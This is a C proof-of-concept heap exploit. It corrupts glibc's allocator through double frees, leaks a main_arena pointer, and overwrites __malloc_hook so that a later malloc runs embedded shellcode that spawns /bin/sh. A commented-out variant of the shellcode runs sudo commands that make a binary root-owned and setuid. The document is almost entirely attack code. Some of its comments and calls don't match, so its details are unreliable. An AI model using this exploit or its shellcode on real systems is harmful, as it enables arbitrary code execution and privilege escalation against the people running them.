// This PoC runs a shellcode by overwritting the malloc_hook function pointer in main_arena

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void puts_heapless(char *str)
{
    write(1, str, strlen(str));
    write(1, "\n", 1);
}

int main()
{
    char *sc = malloc(0x100-8);
    // 64 bit /bin/sh shellcode -- msfvenom -p linux/x64/exec CMD="/bin/sh" -f raw
    //memcpy(sc, "j;X\x99H\xbb/bin/sh\x00SH\x89\xe7h-c\x00\x00H\x89\xe6R\xe8:\x00\x00\x00sudo chown root:root suidbinary; sudo chmod +s suidbinary\x00VWH\x89\xe6\x0f\x05", 97);
    memcpy(sc, "j;X\x99H\xbb/bin/sh\x00SH\x89\xe7h-c\x00\x00H\x89\xe6R\xe8\x08\x00\x00\x00/bin/sh\x00VWH\x89\xe6\x0f\x05", 47);

    puts_heapless("[+] allocate p1, p2");
    char *p1 = malloc(0x100);
    char *p2 = malloc(0x100);

    puts_heapless("\n[+] free p1, p2");
    free(p1);
    free(p2);

    puts_heapless("\n[+] allocate p3");
    char *p3 = malloc(0x100);

    puts_heapless("\n[+] p1 double free");
    free(p1);

    puts_heapless("\n[+] leak main arena->top via p3");
    void *arena_top = *(void **)p3;
    void *malloc_hook = arena_top - 0x68;

    puts_heapless("\n[+] allocate p4");
    char *p4 = malloc(0x100);

    puts_heapless("\n[+] allocate p5 with size 0x60");
    char *p5 = malloc(0x410-8);

    puts_heapless("\n[+] free p5");
    free(p5);
    puts("This puts/printf will mess with p6 and p7");
    puts_heapless("\n[+] Double free p5");
    free(p5); // double free p5

    puts_heapless("\n[+] allocate p6 with size 0x60");
    char *p6 = malloc(0x60); // Takes the old address of p5
    free(p6);

    long int *offset_byte_7f = (long int *)malloc_hook-0x20-3;
    offset_byte_7f = (void*)offset_byte_7f+0xf5;
    printf(&offset_byte_7f);
    // memcpy(p6, &offset_byte_7f, 0x8); 

    memset(p4, 'A', 0x100);

    puts_heapless("\n[+] allocate p6, p7 with size 0x60");
    char *p7 = malloc(0x60);
    char *p8 = malloc(0x60);

    puts_heapless("\n[+] overwrite *(p8+0x13) = malloc_hook");
    memset(p8, 'A', 0x13);
    *(void **)(p8+0x13) = sc;

    puts_heapless("\n[+] allocate p9 - this triggers the malloc_hook");
    char *p9 = malloc(0x100);

    return 0;
}
